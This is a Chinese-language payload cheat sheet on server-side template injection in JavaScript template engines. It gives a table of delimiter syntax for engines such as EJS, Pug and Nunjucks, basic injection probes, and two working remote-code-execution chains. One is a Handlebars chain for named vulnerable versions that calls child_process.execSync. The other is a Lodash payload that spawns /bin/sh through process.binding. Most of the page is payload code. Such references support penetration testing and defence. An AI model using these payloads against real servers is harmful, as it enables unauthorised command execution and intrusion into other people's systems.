# 服务器端模板注入 - JavaScript

> 服务器端模板注入（SSTI）发生在攻击者能够向服务器端模板注入恶意代码时，导致服务器执行任意命令。在JavaScript的上下文中，当使用Handlebars、EJS或Pug等服务器端模板引擎并且用户输入未经过充分清理就集成到模板中时，可能会出现SSTI漏洞。

## 概述

- [模板库](#模板库)
- [Handlebars](#handlebars)
    - [Handlebars - 基本注入](#handlebars---基本注入)
    - [Handlebars - 命令执行](#handlebars---命令执行)
- [Lodash](#lodash)
    - [Lodash - 基本注入](#lodash---基本注入)
    - [Lodash - 命令执行](#lodash---命令执行)
- [参考](#参考)

## 模板库

| 模板名称 | 负载格式 |
| -------- | ------- |
| DotJS    | `{{= }}` |
| DustJS   | `{}`     |
| EJS      | `<% %>`  |
| HandlebarsJS | `{{ }}` |
| HoganJS  | `{{ }}`  |
| Lodash   | `{{= }}` |
| MustacheJS  | `{{ }}`  |
| NunjucksJS  | `{{ }}`  |
| PugJS    | `#{}`    |
| TwigJS   | `{{ }}`  |
| UnderscoreJS | `<% %>`  |
| VelocityJS | `#=set($X="")$X` |
| VueJS    | `{{ }}`  |

## Handlebars

[官方网站](https://handlebarsjs.com/)
> Handlebars 将模板编译为 JavaScript 函数。

### Handlebars - 基本注入

```js
{{this}}
{{self}}
```

### Handlebars - 命令执行

此负载仅适用于以下版本的 Handlebars，在 [GHSA-q42p-pg8m-cqh6](https://github.com/advisories/GHSA-q42p-pg8m-cqh6) 中已修复：

- `>= 4.1.0`，`< 4.1.2`
- `>= 4.0.0`，`< 4.0.14`
- `< 3.0.7`

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('ls -la');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

---

## Lodash

[官方网站](https://lodash.com/docs/4.17.15)
> 现代 JavaScript 实用工具库，提供模块化、性能和附加功能。

### Lodash - 基本注入

如何创建一个模板：

```javascript
const _ = require('lodash');
string = "{{= username}}"
const options = {
  evaluate: /\{\{(.+?)\}\}/g,
  interpolate: /\{\{=(.+?)\}\}/g,
  escape: /\{\{-(.+?)\}\}/g,
};

_.template(string, options);
```

- **string:** 模板字符串。
- **options.interpolate:** 它是一个正则表达式，指定 HTML 的 *插值* 分隔符。
- **options.evaluate:** 它是一个正则表达式，指定 HTML 的 *评估* 分隔符。
- **options.escape:** 它是一个正则表达式，指定 HTML 的 *转义* 分隔符。

为了实现RCE，模板的分隔符由 **options.evaluate** 参数决定。

```javascript
{{= _.VERSION}}
${= _.VERSION}
<%= _.VERSION %>

{{= _.templateSettings.evaluate }}
${= _.VERSION}
<%= _.VERSION %>
```

### Lodash - 命令执行

```js
{{x=Object}}{{w=a=new x}}{{w.type="pipe"}}{{w.readable=1}}{{w.writable=1}}{{a.file="/bin/sh"}}{{a.args=["/bin/sh","-c","id;ls"]}}{{a.stdio=[w,w]}}{{process.binding("spawn_sync").spawn(a).output}}
```

## 参考

- [利用Less.js实现远程代码执行 - Jeremy Buis - 2021年7月1日](https://web.archive.org/web/20210706135910/https://www.softwaresecured.com/exploiting-less-js/)
- [Shopify 应用中的 Handlebars 模板注入与 RCE - Mahmoud Gamal - 2019年4月4日](https://mahmoudsec.blogspot.com/2019/04/handlebars-template-injection-and-rce.html)